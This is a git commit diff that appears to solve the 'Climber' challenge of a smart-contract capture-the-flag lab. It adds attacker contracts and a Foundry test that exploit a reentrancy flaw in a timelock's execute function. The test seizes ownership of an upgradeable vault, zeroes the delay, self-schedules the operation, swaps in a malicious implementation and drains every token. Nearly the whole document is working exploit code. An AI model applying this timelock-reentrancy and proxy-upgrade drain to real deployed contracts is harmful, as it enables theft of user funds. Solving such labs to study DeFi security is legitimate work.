12e60e175daf45b2d99dd830907d83a568e88924
Ratimon <ratixoxo@gmail.com>
2023-06-20 15:24:52 +0700

    Feat & Test(./test./climber): Solving Climber challenge#12

---
+++ src/climber/ClimberAttacker.sol
@@ -0,0 +1,55 @@
+// SPDX-License-Identifier: MIT
+pragma solidity =0.8.19;
+
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {PROPOSER_ROLE} from "@main/climber/ClimberConstants.sol";
+
+import {ClimberVault} from "@main/climber/ClimberVault.sol";
+import {ClimberTimelock} from "@main/climber/ClimberTimelock.sol";
+
+contract ClimberAttackerVaultImp is ClimberVault {
+
+    // constructor() initializer {}
+
+    function withdrawAll(address token) external onlyOwner {
+        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
+    }
+
+}
+
+contract ClimberScheduler {
+
+    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
+        // Recreate the scheduled operation from the attacker contract and call the vault
+        // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
+        // This is leveraging the existing re-entrancy exploit in `execute`
+        ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory data = new bytes[](4);
+
+        // transfer the ownership of the Vault contract to the attacker
+        targets[0] = vaultAddress;
+        values[0] = 0;
+        data[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
+
+        //  grant the role address to an external contract
+        targets[1] = vaultTimelockAddress;
+        values[1] = 0;
+        data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
+
+        // update the delay
+        targets[2] = vaultTimelockAddress;
+        values[2] = 0;
+        data[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+
+        // schedule the proposal
+        targets[3] = address(this);
+        values[3] = 0;
+        data[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",attacker, vaultAddress, vaultTimelockAddress, salt);
+
+        vaultTimelock.schedule(targets, values, data, salt);
+    }
+
+}
--- test/12_Climber.t.sol
+++ test/12_Climber.t.sol
@@ -3,6 +3,7 @@ pragma solidity =0.8.19;
 
 import {Test} from "@forge-std/Test.sol";
 
+import {ERC1967Proxy} from  "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 
 import {ADMIN_ROLE, PROPOSER_ROLE} from "@main/climber/ClimberConstants.sol";
 
@@ -10,10 +11,7 @@ import {DamnValuableToken} from "@main/DamnValuableToken.sol";
 import {ClimberTimelock} from "@main/climber/ClimberTimelock.sol";
 import {ClimberVault} from "@main/climber/ClimberVault.sol";
 
-
-import {ERC1967Proxy} from  "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-
+import {ClimberAttackerVaultImp, ClimberScheduler} from "@main/climber/ClimberAttacker.sol";
 
 contract ClimberTest is Test {
 
@@ -30,6 +28,9 @@ contract ClimberTest is Test {
     ClimberVault vault;
     ClimberTimelock vaultTimelock;
     DamnValuableToken token;
+
+    ClimberScheduler scheduler;
+    ClimberAttackerVaultImp newVaultImpl;
 
     function setUp() public {
         vm.startPrank(deployer);
@@ -68,7 +69,7 @@ contract ClimberTest is Test {
         assertEq(vault.owner() == address(0), false);
         assertEq(vault.owner() == deployer, false);
 
-        // Instantiate timelock
+        // timelock
         vaultTimelock = ClimberTimelock(payable(vault.owner()));
         vm.label(address(vaultTimelock), "ClimberTimelock");
 
@@ -85,6 +86,47 @@ contract ClimberTest is Test {
 
     function test_isSolved( ) public beforeEach() {
         vm.startPrank(attacker);
+
+        scheduler = new ClimberScheduler();
+
+        // there is re-entrancy on this line ; This should be before interactions
+
+        // if (getOperationState(id) != OperationState.ReadyForExecution) {
+        //     revert NotReadyForExecution(id);
+        // }
+
+        // prepare the data for 3 different actions
+        bytes32 salt = keccak256("attack");
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory data = new bytes[](4);
+
+        // transfer the ownership of the Vault contract to the attacker
+        targets[0] = address(vault);
+        values[0] = 0;
+        data[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);
+
+        // grant the role address to an external contract
+        targets[1] = address(vaultTimelock);
+        values[1] = 0;
+        data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(scheduler));
+
+        // update the delay
+        targets[2] = address(vaultTimelock);
+        values[2] = 0;
+        data[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+
+        // schedule the proposal
+        targets[3] = address(scheduler);
+        values[3] = 0;
+        data[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)", attacker, address(vault), address(vaultTimelock), salt);
+
+        vaultTimelock.execute(targets, values, data, salt);
+
+        newVaultImpl = new ClimberAttackerVaultImp();
+        vault.upgradeTo(address(newVaultImpl));
+
+        ClimberAttackerVaultImp(address(vault)).withdrawAll(address(token));
 
         assertEq(token.balanceOf(address(vault)), 0);
         assertEq(token.balanceOf(attacker), VAULT_TOKEN_BALANCE);
